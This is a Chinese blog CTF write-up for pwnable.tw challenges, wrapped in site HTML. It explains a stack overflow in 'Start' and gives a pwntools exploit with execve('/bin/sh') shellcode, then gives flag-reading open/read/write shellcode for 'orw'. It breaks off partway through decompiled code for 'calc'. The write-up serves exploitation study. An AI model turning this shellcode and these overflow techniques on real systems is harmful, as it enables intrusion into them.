<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="google-site-verification" content="CXc5oa8hp0JI3nqiGKAoIQDPqSR7lhLCgNr11-7-XAA" />
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Ld1ng">



    <meta name="description" content="Ld1ng's Blog">


    <meta name="keywords" content="CTF,code,CUMT">


<title>Pwnable部分wp | Ld1ng</title>



    <link rel="icon" href="/favicon.ico">



    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    
    <link rel="stylesheet" href="/fonts/font_oytys7w58zn/iconfont.css">
    
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    
    <script src="/js/jquery-3.7.0.min.js"></script>
    




    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<!-- 搜索的部分 -->



    <script>
    // function searchToggle() {
    //     const width = $(document.body).width()
    //     if(width > 479) {
    //         return;
    //     }
    //     const search = $('.search');
    //     const searchForm = $('.form-search')

    //     if(!search.hasClass("mobile-search")) {
    //         search.addClass("mobile-search");
    //     } else {
    //         search.removeClass("mobile-search");
    //     } 
    // }

    function searchToggle() {
        const width = $(document.body).width()
        if(width > 479) {
            return;
        }
        const search = $('.search');
        const searchForm = $('.form-search');
        const menuToggle = $('.menu-toggle');
        const title = $('.navbar-header-title ');

        if(!search.hasClass("mobile-search")) {
            search.addClass("mobile-search");
            menuToggle.addClass("open-search")
            title.addClass("mobile-title-hidden")
        } else {
            search.removeClass("mobile-search");
            menuToggle.removeClass("open-search")
            // title.css({visibility: 'visible'})
            title.removeClass("mobile-title-hidden")
        } 
    }



    function search(searchInputEl, formEl, flag) {
        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
        $(formEl).submit(function(e){
            e.preventDefault();
            let target = null
            if(searchInputEl == null) {
                const screenWidth = $(document.body).width();
                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
                console.log(target);
            } else {
                target = $(searchInputEl)
            }

            if(!flag && target.val() === '') {
                return ;
            }

            $("#u-search").fadeIn(500, function() {
                $("body > .wrapper").addClass("modal-active");

                $.ajax({
                    url: path,
                    dataType: "json",
                    beforeSend: function (xhr) {
                        $input = target.val();
                        $(".form-input").val($input);
                        const loadingBar = $('.search-loading-bar') 
                        loadingBar.css({
                            width:'100%',
                            display: 'block'
                        });
                    },
                    success: function( datas ) {
                        console.log(datas);
                        const $resultPanel = $(".modal-body")[0];
                        let str = `<ul class="modal-results">`;
                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
                        $resultPanel.innerHTML = "";
                        let hasResult = false
                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;

                        if ($(".form-input").val().trim().length <= 0) {
                            // 没有结果
                            $resultPanel.innerHTML = text;
                            return;
                        }
                        datas.forEach(function (data, index) {
                            var isMatch = true;
                            if (!data.title || data.title.trim() === '') {
                                data.title = "Untitled";
                            }
                            var data_title = data.title.trim().toLowerCase();
                            var data_content = data.content && data.content.trim().replace(/<[^>]+>/g, "").toLowerCase() || '';
                            var data_url = data.url;
                            var index_title = -1;
                            var index_content = -1;
                            var first_occur = -1;
                            // only match artiles with not empty contents
                            if (data_content !== '') {
                                keywords.forEach(function (keyword, i) {
                                    index_title = data_title.indexOf(keyword);
                                    index_content = data_content.indexOf(keyword);

                                    if (index_title < 0 && index_content < 0) {
                                        isMatch = false;
                                    } else {
                                        hasResult = true
                                        if (index_content < 0) {
                                            index_content = 0;
                                        }
                                        if (i == 0) {
                                            first_occur = index_content;
                                        }
                                    }
                                });
                            } else {
                                isMatch = false;
                            }
                            // show search results
                            if (isMatch) {
                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
                                var content = data.content.trim().replace(/<[^>]+>/g, "");
                                if (first_occur >= 0) {
                                    // cut out 200 characters
                                    var start = first_occur - 40;
                                    var end = first_occur + 160;

                                    if (start < 0) {
                                        start = 0;
                                    }

                                    if (start == 0) {
                                        end = 200;
                                    }

                                    if (end > content.length) {
                                        end = content.length;
                                    }

                                    var match_content = content.substring(start, end);

                                    // highlight all keywords
                                    keywords.forEach(function (keyword) {
                                        var regS = new RegExp(keyword, "gi");
                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
                                    });

                                    str += `<span class="content"> ${match_content} ...</span></a>`;
                                }
                                str += "</li>";
                            }
                        });
                        str += "</ul>";
                        if(hasResult) {
                            $resultPanel.innerHTML = str;
                        } else {
                            $resultPanel.innerHTML = text;
                        }

                    },
                    complete: function() {
                        setTimeout(() => {
                                const loadingBar = $('.search-loading-bar') 
                                loadingBar.css({
                                    width:'0%',
                                    display: 'none'
                                });
                        }, 300)
                    }
                });
            })

        });
    }

    $(document).ready(function() {
        $('.modal-close').click(function () { 
            $("#u-search").fadeOut();
            $("body > .wrapper").removeClass("modal-active")
        })

        $('.modal-overlay').click(function() {
            $("#u-search").fadeOut();
            $("body > .wrapper").removeClass("modal-active")
        })
        search(null, ".form-search", false)
        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
    })
</script>

<meta name="generator" content="Hexo 6.0.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/"><i class="iconfont icon-home1"></i> Home</a></div>
            <div class="menu navbar-right">
                <!-- 这里表示的是pc端搜索框 -->
				
				
    <div class="search ">
        <div class="search-btn" onClick="searchToggle()">
            <img src="/image/search.png" class="search-btn-img" />
        </div>
        <form class="form-search">
            <input class="input" placeholder="Searching" autocomplete="off" id="pc-search-input"/>
        </form>
    </div>

				
				
				  
				  
				  <a class="menu-item" href="/archives">
					<i class="iconfont icon-navicon-wzgl"></i>
					Posts
				  </a>
				
				  
				  
				  <a class="menu-item" href="/categories">
					<i class="iconfont icon-fenlei"></i>
					Categories
				  </a>
				
				  
				  
				  <a class="menu-item" href="/tags">
					<i class="iconfont icon-tag1"></i>
					Tags
				  </a>
				
				  
				  
				  <a class="menu-item" href="/links">
					<i class="iconfont icon-link1"></i>
					Links
				  </a>
				
				  
				  
				  <a class="menu-item" href="/about">
					<i class="iconfont icon-diandengpao"></i>
					About
				  </a>
				
				<input id="switch_default" type="checkbox" class="switch_default">
				<label for="switch_default" class="toggleBtn"></label>
        </div>
    </div>
</nav>

    
<nav class="navbar-mobile" id="nav-mobile">
    <div class="container">
        <div class="navbar-header">
            <div>
                <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
            </div>
            <div class="navbar-mobile-right">
                
                
    <div class="search ">
        <div class="search-btn" onClick="searchToggle()">
            <img src="/image/search.png" class="search-btn-img" />
        </div>
        <form class="form-search">
            <input class="input" placeholder="Searching" autocomplete="off" id="mobile-search-input"/>
        </form>
    </div>

                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
            </div>

        </div>
        <div class="menu" id="mobile-menu">
            
            <a class="menu-item" href="/archives">Posts</a>
            
            <a class="menu-item" href="/categories">Categories</a>
            
            <a class="menu-item" href="/tags">Tags</a>
            
            <a class="menu-item" href="/links">Links</a>
            
            <a class="menu-item" href="/about">About</a>
            
        </div>
    </div>
</nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Pwnable部分wp</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Ld1ng</a>
                    
					&nbsp;
                    
                        <span class="post-time">
                        Date: <a href="#">October 25, 2020</a>
                        </span>
                    
					&nbsp;
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/PWN/">PWN</a>
                            
                        </span>
                    
					<br>
                     
    <span class="post-count">
Words:
    <a href="">7.4k</a>  
    </span>

&nbsp;

    <span class="post-count">
Time:
    <a href="">36min</a>  
    </span>

&nbsp;
<span id="busuanzi_container_page_pv">
  Views: <a href=""><span id="busuanzi_value_page_pv"></a></span></a>  
</span>
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是很久以前边做边记的学习记录<br>pwnable题目质量很高，值得认真学习和研究一下</p>
<h2 id="0x01-Start"><a href="#0x01-Start" class="headerlink" title="0x01 Start"></a>0x01 Start</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), statically linked, <span class="keyword">not</span> stripped</span><br><span class="line"><span class="comment">//32位程序，静态编译</span></span><br></pre></td></tr></tbody></table></figure>

<p>程序只有这几行汇编，加上注释方便理解</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">push    esp</span><br><span class="line">push    offset _exit</span><br><span class="line">xor     eax, eax</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">xor     edx, edx</span><br><span class="line">push    3A465443h       ;"CTF:"</span><br><span class="line">push    20656874h       ;"the "</span><br><span class="line">push    20747261h       ;"art "</span><br><span class="line">push    74732073h       ;"s st"</span><br><span class="line">push    2774654Ch       ;"Let'"</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h         ; len</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; sys_write</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 3Ch</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; sys_read</span><br><span class="line">add     esp, 14h</span><br><span class="line">retn</span><br></pre></td></tr></tbody></table></figure>

<p>简单的系统调用，write和read<br>由于程序很简单，可以gdb动调理解逻辑 (很重要)<br>关键点在最后的<code>add   esp, 14h  ;  retn</code>，通过读入数据可以覆盖到返回地址，并返回<code>.text:08048087  mov  ecx, esp </code>，这时执行sys_write，即可打印出esp的地址，然后继续写入shellcode覆盖返回地址，那么程序就可以执行你的shellcode</p>
<p>注意：shellcode可以查x86系统调用表来调用execve(‘/bin/sh’,0,0)</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">p = process(<span class="string">'./start'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x14</span> + p32(<span class="number">0x8048087</span>)<span class="comment">#leak esp after +0x18</span></span><br><span class="line">p.sendafter(<span class="string">"Let's start the CTF:"</span>,payload)</span><br><span class="line">esp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">'esp: '</span>+<span class="built_in">hex</span>(esp)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">shellcode=<span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br><span class="line"><span class="comment">#shellcode = asm('xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov al,0xb;int 0x80')</span></span><br><span class="line"><span class="comment">#execve('/bin/sh',null,null)</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x14</span> + p32(esp+<span class="number">0x14</span>) + shellcode <span class="comment">#Jump to shellcode</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="0x02-orw"><a href="#0x02-orw" class="headerlink" title="0x02 orw"></a>0x02 orw</h2><p>经典之经典，shellcode必刷题</p>
<p>32位程序，开了沙盒</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">orw_seccomp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, <span class="number">0x60</span>u);</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>禁用了execve()，所以无法使用onegadget<br>但是程序开了open()，read()，write()</p>
<p>程序很简单，在bss段输入shellcode并执行，那么方法就是利用orw</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn  <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line">sh=remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh()) </span></span><br><span class="line"><span class="comment"># I don't wanna be a tool boy</span></span><br><span class="line">shellcode=<span class="string">""</span></span><br><span class="line">shellcode += asm(<span class="string">'xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;'</span>)</span><br><span class="line"><span class="comment">#open(file,0,0)</span></span><br><span class="line">shellcode += asm(<span class="string">'mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;'</span>)</span><br><span class="line"><span class="comment">#read(3,file,0x30)</span></span><br><span class="line">shellcode += asm(<span class="string">'mov eax,0x4;mov bl,0x1;int 0x80;'</span>)</span><br><span class="line"><span class="comment">#write(1,file,0x30)</span></span><br><span class="line">recv = sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">flag = sh.recv(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></tbody></table></figure>

<h2 id="0x03-calc"><a href="#0x03-calc" class="headerlink" title="0x03 calc"></a>0x03 calc</h2><p>一道值得深究的题目，能写的知识点太多，我择要点写一下<br>一个计算器程序，代码逻辑很繁琐，考察很强的逆向功底，需要静下心来慢慢分析<br>主要逻辑在于解析表达式的代码，贴上注释过的代码</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">int</span> buf, _DWORD *<span class="built_in">list</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">int</span> count; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> buf_start; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> op[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  buf_start = buf;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  bzero(op, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( (*(i + buf) - <span class="number">48</span>) &gt; <span class="number">9</span> )                <span class="comment">// 保存操作符之前的数字</span></span><br><span class="line">    {</span><br><span class="line">      len = i + buf - buf_start;</span><br><span class="line">      ptr = <span class="built_in">malloc</span>(len + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(ptr, buf_start, len);</span><br><span class="line">      ptr[len] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(ptr, <span class="string">"0"</span>) )</span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"prevent division by zero"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      v9 = atoi(ptr);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">      {</span><br><span class="line">        count = (*<span class="built_in">list</span>)++;                      <span class="comment">// list[0]存放数字个数</span></span><br><span class="line">        <span class="built_in">list</span>[count + <span class="number">1</span>] = v9;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( *(i + buf) &amp;&amp; (*(i + <span class="number">1</span> + buf) - <span class="number">48</span>) &gt; <span class="number">9</span> )<span class="comment">// 不允许连续有两个运算符</span></span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"expression error!"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      buf_start = i + <span class="number">1</span> + buf;</span><br><span class="line">      <span class="keyword">if</span> ( op[v7] )                             <span class="comment">// 如果有前序运算符，进行运算符比较，然后计算</span></span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">switch</span> ( *(i + buf) )                  <span class="comment">//优先级操作</span></span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">            <span class="keyword">if</span> ( op[v7] != <span class="string">'+'</span> &amp;&amp; op[v7] != <span class="string">'-'</span> )</span><br><span class="line">            {</span><br><span class="line">              eval(<span class="built_in">list</span>, op[v7]);</span><br><span class="line">              op[v7] = *(i + buf);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">              op[++v7] = *(i + buf);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">            eval(<span class="built_in">list</span>, op[v7]);</span><br><span class="line">            op[v7] = *(i + buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(<span class="built_in">list</span>, op[v7--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        op[v7] = *(i + buf);                    <span class="comment">// 如果没有前序运算符，把当前运算符放入op数组中</span></span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( !*(i + buf) )                        <span class="comment">// 空字符结束</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( v7 &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(<span class="built_in">list</span>, op[v7--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>最后的运算是eval()，具体操作见代码</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">eval</span><span class="params">(_DWORD *<span class="built_in">list</span>, <span class="keyword">char</span> op)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( op == <span class="string">'+'</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">list</span>[*<span class="built_in">list</span> - <span class="number">1</span>] += <span class="built_in">list</span>[*<span class="built_in">list</span>];</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( op &gt; <span class="string">'+'</span> )</span><br><span class="line">  